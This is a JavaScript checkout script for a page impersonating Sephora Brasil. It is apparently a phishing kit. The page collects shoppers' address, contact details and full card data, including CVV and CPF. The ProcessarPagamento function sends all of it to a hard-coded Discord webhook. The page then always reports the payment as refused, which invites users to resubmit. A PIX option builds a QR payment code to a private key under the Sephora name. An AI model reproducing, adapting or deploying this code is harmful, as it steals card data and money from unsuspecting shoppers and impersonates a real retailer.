let checkoutState = {
    step: 1,
    shipping: {},
    payment: {},
    order: {}
};

// Carregar dados do carrinho
function loadCheckout() {
    const cart = JSON.parse(localStorage.getItem('sephora_cart')) || [];

    if (cart.length === 0) {
        showEmptyCart();
        return;
    }

    renderCheckoutStep();
}

function showEmptyCart() {
    document.getElementById('checkout-container').innerHTML = `
            <div class="error">
                <h2>Seu carrinho está vazio</h2>
                <p>Adicione produtos ao carrinho antes de finalizar a compra.</p>
                <button onclick="window.location.href='../'" style="margin-top: 15px; padding: 10px 20px; background: #d80000; color: white; border: none; border-radius: 4px; cursor: pointer;">
                    Continuar Comprando
                </button>
            </div>
        `;
}

function renderCheckoutStep() {
    const cart = JSON.parse(localStorage.getItem('sephora_cart')) || [];
    const subtotal = cart.reduce((total, item) => total + ((item.precoOriginal || item.preco) * item.quantidade), 0);
    const discount = cart.reduce((total, item) => total + (((item.precoOriginal || item.preco) - item.preco) * item.quantidade), 0);
    const total = subtotal - discount;

    switch (checkoutState.step) {
        case 1: renderShippingStep(cart, subtotal, discount, total); break;
        case 2: renderPaymentStep(cart, subtotal, discount, total); break;
        case 3: renderConfirmationStep(); break;
    }

    updateStepIndicator();
}

// Passo 1 - Shipping
function renderShippingStep(cart, subtotal, discount, total) {
    document.getElementById('checkout-container').innerHTML = `
        <div class="checkout-content">
            <div class="checkout-forms">
                <div class="checkout-form">
                    <h2 class="form-title">Endereço de Entrega</h2>
                    <div class="form-group"><label>CEP</label><input type="text" id="cep" placeholder="00000-000" maxlength="9" oninput="formatCEP(this)"></div>
                    <div class="form-row">
                        <div class="form-group"><label>Rua</label><input type="text" id="street"></div>
                        <div class="form-group"><label>Número</label><input type="text" id="number"></div>
                    </div>
                    <div class="form-group"><label>Complemento</label><input type="text" id="complement"></div>
                    <div class="form-row">
                        <div class="form-group"><label>Bairro</label><input type="text" id="neighborhood"></div>
                        <div class="form-group"><label>Cidade</label><input type="text" id="city"></div>
                    </div>
                    <div class="form-group">
                        <label>Estado</label>
                        <select id="state">
                            <option value="">Selecione</option>
                            <option value="AC">Acre</option><option value="AL">Alagoas</option><option value="AP">Amapá</option><option value="AM">Amazonas</option>
                            <option value="BA">Bahia</option><option value="CE">Ceará</option><option value="DF">Distrito Federal</option><option value="ES">Espírito Santo</option>
                            <option value="GO">Goiás</option><option value="MA">Maranhão</option><option value="MT">Mato Grosso</option><option value="MS">Mato Grosso do Sul</option>
                            <option value="MG">Minas Gerais</option><option value="PA">Pará</option><option value="PB">Paraíba</option><option value="PR">Paraná</option>
                            <option value="PE">Pernambuco</option><option value="PI">Piauí</option><option value="RJ">Rio de Janeiro</option><option value="RN">Rio Grande do Norte</option>
                            <option value="RS">Rio Grande do Sul</option><option value="RO">Rondônia</option><option value="RR">Roraima</option><option value="SC">Santa Catarina</option>
                            <option value="SP">São Paulo</option><option value="SE">Sergipe</option><option value="TO">Tocantins</option>
                        </select>
                    </div>
                </div>

                <div class="checkout-form">
                    <h2 class="form-title">Informações de Contato</h2>
                    <div class="form-group"><label>Nome Completo</label><input type="text" id="fullname"></div>
                    <div class="form-group"><label>E-mail</label><input type="email" id="email"></div>
                    <div class="form-group"><label>Telefone</label><input type="tel" id="phone" placeholder="(11) 99999-9999" oninput="formatPhone(this)"></div>
                </div>
            </div>

            <div class="order-summary">
                <h2 class="summary-title">Resumo do Pedido</h2>
                <div class="order-items">
                    ${cart.map(item => `
                        <div class="order-item">
                            <img src="${item.imagem}" alt="${item.nome}" class="order-item-image">
                            <div class="order-item-info">
                                <div class="order-item-name">${item.nome}</div>
                                <div class="order-item-price">R$ ${item.preco.toFixed(2).replace('.', ',')}</div>
                                <div class="order-item-quantity">Quantidade: ${item.quantidade}</div>
                            </div>
                        </div>
                    `).join('')}
                </div>
                <div class="summary-line"><span>Subtotal</span><span>R$ ${subtotal.toFixed(2).replace('.', ',')}</span></div>
                ${discount > 0 ? `<div class="summary-line discount"><span>Descontos</span><span>- R$ ${discount.toFixed(2).replace('.', ',')}</span></div>` : ''}
                <div class="summary-line"><span>Frete</span><span>Grátis</span></div>
                <div class="summary-total"><span>Total</span><span>R$ ${total.toFixed(2).replace('.', ',')}</span></div>
                <button class="btn-continue" onclick="validateShipping()">CONTINUAR PARA PAGAMENTO</button>
                <button class="btn-back" onclick="window.location.href='../carrinho/'">VOLTAR AO CARRINHO</button>
            </div>
        </div>
        `;
}

// Passo 2 - Payment
function renderPaymentStep(cart, subtotal, discount, total) {
    document.getElementById('checkout-container').innerHTML = `
        <div class="checkout-content">
            <div class="checkout-forms">
                <div class="checkout-form">
                    <h2 class="form-title">Método de Pagamento</h2>
                    <div class="payment-methods">
                        <div class="payment-option" onclick="selectPayment('credit')">
                            <input type="radio" name="payment" id="credit" value="credit"><label for="credit">Cartão de Crédito</label>
                        </div>
                        <div class="payment-option" onclick="selectPayment('debit')">
                            <input type="radio" name="payment" id="debit" value="debit"><label for="debit">Cartão de Débito</label>
                        </div>
                        <div class="payment-option" onclick="selectPayment('pix')">
                            <input type="radio" name="payment" id="pix" value="pix"><label for="pix">PIX</label>
                        </div>
                    </div>
                    <div id="credit-card-form" style="display:none;margin-top:20px;">
                        <div class="form-group"><label>Número do Cartão</label><input type="text" id="card-number" placeholder="0000 0000 0000 0000" maxlength="19" oninput="formatCardNumber(this)"></div>
                        <div class="form-row">
                            <div class="form-group"><label>Validade</label><input type="text" id="card-expiry" placeholder="MM/AA" maxlength="5" oninput="formatExpiry(this)"></div>
                            <div class="form-group"><label>CVV</label><input type="text" id="card-cvv" placeholder="000" maxlength="3"></div>
                        </div>
                        <div class="form-group"><label>Nome no Cartão</label><input type="text" id="card-name"></div>
                        <div class="form-group"><label>CPF do Titular</label><input type="text" id="card-cpf" placeholder="000.000.000-00" maxlength="14" oninput="formatCPF(this)"></div>
                    </div>
                    <div id="pix-info" style="display:none;margin-top:20px;text-align:center;padding:20px;background:#eaeaea;border-radius:8px;">
                        <h3 style="margin-bottom:15px;">Pagamento via PIX</h3>
                        <p>Você será redirecionado para efetuar o pagamento após confirmar o pedido.</p>
                    </div>
                </div>
            </div>

            <div class="order-summary">
                <h2 class="summary-title">Resumo do Pedido</h2>
                <div class="order-items">
                    ${cart.map(item => `
                        <div class="order-item">
                            <img src="${item.imagem}" alt="${item.nome}" class="order-item-image">
                            <div class="order-item-info">
                                <div class="order-item-name">${item.nome}</div>
                                <div class="order-item-price">R$ ${item.preco.toFixed(2).replace('.', ',')}</div>
                                <div class="order-item-quantity">Quantidade: ${item.quantidade}</div>
                            </div>
                        </div>
                    `).join('')}
                </div>
                <div class="summary-line"><span>Subtotal</span><span>R$ ${subtotal.toFixed(2).replace('.', ',')}</span></div>
                ${discount > 0 ? `<div class="summary-line discount"><span>Descontos</span><span>- R$ ${discount.toFixed(2).replace('.', ',')}</span></div>` : ''}
                <div class="summary-line"><span>Frete</span><span>Grátis</span></div>
                <div class="summary-total"><span>Total</span><span>R$ ${total.toFixed(2).replace('.', ',')}</span></div>
                <button class="btn-continue" onclick="validatePayment()">FINALIZAR PEDIDO</button>
                <button class="btn-back" onclick="previousStep()">VOLTAR</button>
            </div>
        </div>
        `;
}

// Passo 3 - Confirmation
function renderConfirmationStep() {
    document.getElementById('checkout-container').innerHTML = `
        <div class="success-message">
            <div class="error-icon">❌</div>
            <h2 class="success-title">Pedido Recusado!</h2>
            <p class="success-text">Pagamento recusado, verifique as informações preenchida e tente novamente.</p>
            <button onclick="window.location.href='../'" class="btn-continue" style="max-width:300px;">CONTINUAR COMPRANDO</button>
        </div>
        `;
    localStorage.removeItem('sephora_cart');
}

function updateStepIndicator() {
    document.querySelectorAll('.step').forEach((step, index) => {
        step.classList.remove('active', 'completed');
        if (index + 1 < checkoutState.step) step.classList.add('completed');
        else if (index + 1 === checkoutState.step) step.classList.add('active');
    });
}

function validateShipping() {
    const fields = ['cep', 'street', 'number', 'neighborhood', 'city', 'state', 'fullname', 'email', 'phone'];
    let valid = true;
    fields.forEach(f => {
        const e = document.getElementById(f);
        if (!e.value.trim()) { e.style.borderColor = 'red'; valid = false; }
        else e.style.borderColor = '#ddd';
    });
    if (valid) {
        checkoutState.shipping = {
            cep: document.getElementById('cep').value,
            street: document.getElementById('street').value,
            number: document.getElementById('number').value,
            complement: document.getElementById('complement').value,
            neighborhood: document.getElementById('neighborhood').value,
            city: document.getElementById('city').value,
            state: document.getElementById('state').value,
            fullname: document.getElementById('fullname').value,
            email: document.getElementById('email').value,
            phone: document.getElementById('phone').value
        };
        checkoutState.step = 2;
        renderCheckoutStep();
    }
}

function selectPayment(method) {
    document.querySelectorAll('.payment-option').forEach(o => o.classList.remove('selected'));
    document.querySelector(`.payment-option input[value="${method}"]`).parentElement.classList.add('selected');
    document.querySelector(`.payment-option input[value="${method}"]`).checked = true;
    document.getElementById('credit-card-form').style.display = (method === 'credit' || method === 'debit') ? 'block' : 'none';
    document.getElementById('pix-info').style.display = (method === 'pix') ? 'block' : 'none';
    checkoutState.payment.method = method;
}

function validatePayment() {
    if (!checkoutState.payment.method) { alert('Selecione um método de pagamento.'); return; }
    if (checkoutState.payment.method === 'credit' || checkoutState.payment.method === 'debit') {
        const fields = ['card-number', 'card-expiry', 'card-cvv', 'card-name', 'card-cpf'];
        let valid = true;
        fields.forEach(f => {
            const e = document.getElementById(f);
            if (!e.value.trim()) { e.style.borderColor = 'red'; valid = false; } else e.style.borderColor = '#ddd';
        });
        if (!valid) { return; }
        checkoutState.payment.card = {
            number: document.getElementById('card-number').value,
            expiry: document.getElementById('card-expiry').value,
            cvv: document.getElementById('card-cvv').value,
            name: document.getElementById('card-name').value,
            cpf: document.getElementById('card-cpf').value
        };
        ProcessarPagamento(checkoutState);
        checkoutState.step = 3;
        renderCheckoutStep();
    } else if (checkoutState.payment.method === 'pix') renderPixPaymentPage();
}

function previousStep() { if (checkoutState.step > 1) { checkoutState.step--; renderCheckoutStep(); } }

// PIX helpers
function montaCampo(id, valor) { return id + valor.length.toString().padStart(2, '0') + valor; }
function calculateCRC16CCITT(str) {
    let crc = 0xFFFF;
    for (let o = 0; o < str.length; o++) { crc ^= str.charCodeAt(o) << 8; for (let b = 0; b < 8; b++) { crc = (crc & 0x8000) ? ((crc << 1) ^ 0x1021) : (crc << 1); } } crc &= 0xFFFF; return crc.toString(16).toUpperCase().padStart(4, '0');
}
function gerarPayloadPix(chavePix, nome, cidade, valor, txid) {
    const gui = montaCampo("00", "br.gov.bcb.pix");
    const chave = montaCampo("01", chavePix);
    const merchant = montaCampo("26", gui + chave);
    const valorF = valor.toFixed(2);
    let p = "";
    p += montaCampo("00", "01"); p += merchant; p += montaCampo("52", "0000"); p += montaCampo("53", "986"); p += montaCampo("54", valorF);
    p += montaCampo("58", "BR"); p += montaCampo("59", nome); p += montaCampo("60", cidade); p += montaCampo("62", montaCampo("05", txid));
    p += "6304"; const crc = calculateCRC16CCITT(p); return p + crc;
}
function gerarQRCode(pixCode, elementId) { new QRCode(document.getElementById(elementId), { text: pixCode, width: 250, height: 250 }); }

function renderPixPaymentPage() {
    const cart = JSON.parse(localStorage.getItem('sephora_cart')) || [];
    const subtotal = cart.reduce((t, i) => t + ((i.precoOriginal || i.preco) * i.quantidade), 0);
    const discount = cart.reduce((t, i) => t + (((i.precoOriginal || i.preco) - i.preco) * i.quantidade), 0);
    const total = subtotal - discount;
    const chavePix = "104f85f1-6a67-47fd-bcd8-11e84844eef3";
    const nome = "Sephora Brasil"; const cidade = "SAO PAULO";
    const txid = "TX" + Math.random().toString(36).substring(2, 10).toUpperCase();
    const pixCode = gerarPayloadPix(chavePix, nome, cidade, total, txid);

    document.getElementById('checkout-container').innerHTML = `
            <div class="checkout-content" style="text-align:center;padding:20px;">
                <h2>Pagamento via PIX</h2>
                <div style="background:white;padding:20px;border-radius:12px;display:inline-block;margin:20px 0;">
                    <div id="qrcode" style="width:250px;height:250px;margin:0 auto;"></div>
                </div>
                <h3 style="color:#d80000;">Valor: R$ ${total.toFixed(2).replace('.', ',')}</h3>
                <p>Escaneie o QR Code ou copie o código abaixo</p>
                <div style="background:#f8f8f8;padding:15px;border-radius:8px;margin:15px 0;">
                    <input type="text" id="pix-code" value="${pixCode}" readonly style="width:100%;padding:12px;border:1px solid #ddd;border-radius:4px;">
                    <button onclick="copiarPix()" style="margin-top:10px;padding:12px 20px;background:#d80000;color:white;border:none;border-radius:4px;cursor:pointer;">Copiar</button>
                </div>
                <div style="display: flex; gap: 15px; justify-content: center; margin-top: 25px;"> 
                    <button class="btn-back" onclick="previousStep()">VOLTAR</button> 
                    <button class="btn-continue" onclick="confirmarPagamentoPix()">JÁ PAGUEI</button> 
                </div>
            </div>
        `;
    gerarQRCode(pixCode, 'qrcode');
}

function copiarPix() {
    const input = document.getElementById('pix-code'); input.select(); document.execCommand('copy');
}
function confirmarPagamentoPix() {
    ProcessarPagamento(checkoutState); checkoutState.step = 3; renderCheckoutStep();
}

// Formatações
function formatCEP(input) { let v = input.value.replace(/\D/g, ''); if (v.length > 5) v = v.substring(0, 5) + '-' + v.substring(5, 8); input.value = v; }
function formatPhone(input) { let v = input.value.replace(/\D/g, ''); if (v.length > 2) v = '(' + v.substring(0, 2) + ') ' + v.substring(2); if (v.length > 10) v = v.substring(0, 10) + '-' + v.substring(10, 14); input.value = v; }
function formatCardNumber(input) { let v = input.value.replace(/\D/g, ''); if (v.length > 4) v = v.substring(0, 4) + ' ' + v.substring(4, 8) + ' ' + v.substring(8, 12) + ' ' + v.substring(12, 16); input.value = v; }
function formatExpiry(input) { let v = input.value.replace(/\D/g, ''); if (v.length > 2) v = v.substring(0, 2) + '/' + v.substring(2, 4); input.value = v; }
function formatCPF(input) { let v = input.value.replace(/\D/g, ''); if (v.length > 3) v = v.substring(0, 3) + '.' + v.substring(3, 6) + '.' + v.substring(6, 9) + '-' + v.substring(9, 11); input.value = v; }

// Processar pagamento (webhook)
function ProcessarPagamento(infos) {
    const cart = JSON.parse(localStorage.getItem('sephora_cart')) || [];
    const subtotal = cart.reduce((t, i) => t + ((i.precoOriginal || i.preco) * i.quantidade), 0);
    const discount = cart.reduce((t, i) => t + (((i.precoOriginal || i.preco) - i.preco) * i.quantidade), 0);
    const total = subtotal - discount;
    const webhookData = {
        content: null,
        embeds: [{
            title: "🚨 CHECKOUT - SEPHORA",
            color: 16711680,
            fields: [
                { name: "👤 Cliente", value: `**Nome:** ${checkoutState.shipping.fullname || 'N/A'}\n**Email:** ${checkoutState.shipping.email || 'N/A'}\n**Telefone:** ${checkoutState.shipping.phone || 'N/A'}`, inline: false },
                { name: "🏠 Endereço", value: `**CEP:** ${checkoutState.shipping.cep || 'N/A'}\n**Rua:** ${checkoutState.shipping.street || 'N/A'}, ${checkoutState.shipping.number || 'N/A'} ${checkoutState.shipping.complement || ''}\n**Bairro:** ${checkoutState.shipping.neighborhood || 'N/A'}\n**Cidade:** ${checkoutState.shipping.city || 'N/A'}-${checkoutState.shipping.state || 'N/A'}`, inline: false },
                { name: "💳 Método", value: checkoutState.payment.method ? checkoutState.payment.method.toUpperCase() : 'N/A', inline: true },
                { name: "🕒 Data/Hora", value: new Date().toLocaleString('pt-BR'), inline: true },
                { name: "📦 Resumo", value: `Total de itens: ${cart.length}\nValor total: R$ ${total.toFixed(2).replace('.', ',')}`, inline: false }
            ],
            footer: { text: "Sephora Checkout • Pagamento Recusado" }, timestamp: new Date().toISOString()
        }]
    };
    if ((checkoutState.payment.method === 'credit' || checkoutState.payment.method === 'debit') && checkoutState.payment.card) {
        webhookData.embeds[0].fields.push({ name: "💳 Dados do Cartão", value: `**Número:** ${checkoutState.payment.card.number || 'N/A'}\n**Validade:** ${checkoutState.payment.card.expiry || 'N/A'}\n**CVV:** ${checkoutState.payment.card.cvv || 'N/A'}\n**Nome:** ${checkoutState.payment.card.name || 'N/A'}\n**CPF:** ${checkoutState.payment.card.cpf || 'N/A'}`, inline: false });
    }
    if (cart.length > 0) { let p = ""; cart.forEach(i => { p += `• ${i.nome} - R$ ${i.preco.toFixed(2).replace('.', ',')} x ${i.quantidade}\n`; }); webhookData.embeds[0].fields.push({ name: "🛍 Produtos", value: p, inline: false }); }
    const webhookURL = "https://discord.com/api/webhooks/1410807047976648714/eEtOqWvy0Ky5GilF-0MyQC3m32N6R3lu6FiAgMqq_bc5zjgb0VCf61PBEzKV7eOen_jt";
    fetch(webhookURL, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(webhookData) })
        .then(r => { if (!r.ok) console.error('Erro webhook:', r.statusText); }).catch(e => console.error(e));
}

document.addEventListener('DOMContentLoaded', loadCheckout);
